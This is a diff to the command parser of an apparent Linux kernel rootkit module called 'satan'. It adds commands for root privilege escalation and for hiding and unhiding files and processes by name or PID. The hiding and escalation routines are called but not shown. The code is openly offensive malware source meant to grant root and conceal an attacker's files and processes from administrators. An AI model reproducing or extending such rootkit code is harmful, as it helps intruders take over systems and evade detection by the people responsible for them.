@@ -1,15 +1,35 @@
 // Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
 #include "command.h"
 
+#include <linux/kernel.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
 
+#include "file.h"
 #include "privesc.h"
+#include "proc.h"
 
 
-#define CMD_BUF_SIZE 128
+#define CMD_PRIVESC     "privesc"
+#define CMD_FILE_HIDE   "file_hide"
+#define CMD_FILE_UNHIDE "file_unhide"
+#define CMD_PROC_HIDE   "proc_hide"
+#define CMD_PROC_UNHIDE "proc_unhide"
 
-static char buf[CMD_BUF_SIZE] = {0};
+
+#define CMD_RET_SUCCESS          0
+#define CMD_RET_UNKNOWN_CMD      1
+#define CMD_RET_INSUFFICIENT_ARG 2
+
+#define DIE_IF_NO_ARG(arg)                      \
+        if (!arg) {                             \
+                ret = CMD_RET_INSUFFICIENT_ARG; \
+                goto out;                       \
+        }
+
+
+#define CMD_SIZE 128
+static char cmd[CMD_SIZE] = {0};
 static char *arg = NULL;
 
 
@@ -19,30 +39,49 @@ static char *arg = NULL;
  *
  * Return: zero on success and non-zero otherwise.
  */
-int satan_command_parse(const char *cmd)
+int satan_command_parse(const char *s)
 {
-        int ret = 0;
+        int ret = CMD_RET_SUCCESS;
 
-        memset(buf, 0, CMD_BUF_SIZE);
-        strncpy(buf, cmd, CMD_BUF_SIZE - 1);
+        memset(cmd, 0, CMD_SIZE);
+        strncpy(cmd, s, CMD_SIZE);
+        cmd[CMD_SIZE - 1] = 0;
 
-        arg = strnchr(buf, CMD_BUF_SIZE - 1, ' ');
+        arg = strnchr(cmd, CMD_SIZE, ' ');
         
         if (arg)
                 *arg++ = 0;
        
 
-        pr_info("satan: command: received (%s,%s)\n", buf, arg);
+        pr_info("satan: command: received (%s,%s)\n", cmd, arg);
 
         // At this point:
-        // 1. `buf` points to the command string.
+        // 1. `cmd` points to the command string.
         // 2. `arg` points to the argument string.
-        if (!strncmp(buf, "give_root", CMD_BUF_SIZE - 1)) {
+        if (!strncmp(cmd, CMD_PRIVESC, CMD_SIZE)) {
                 satan_privesc_root(arg);
+
+        } else if (!strncmp(cmd, CMD_FILE_HIDE, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
+                satan_file_hide(arg);
+
+        } else if (!strncmp(cmd, CMD_FILE_UNHIDE, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
+                satan_file_unhide(arg);
+
+        } else if (!strncmp(cmd, CMD_PROC_HIDE, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
+                satan_proc_hide(simple_strtoul(arg, NULL, 10));
+
+        } else if (!strncmp(cmd, CMD_PROC_UNHIDE, CMD_SIZE)) {
+                DIE_IF_NO_ARG(arg);
+                satan_proc_unhide(simple_strtoul(arg, NULL, 10));
+
         } else {
-                pr_info("satan: unknown command: %s\n", buf);
-                ret = 1;
+                pr_info("satan: unknown command: %s\n", cmd);
+                ret = CMD_RET_UNKNOWN_CMD;
         }
 
+out:
         return ret;
 }
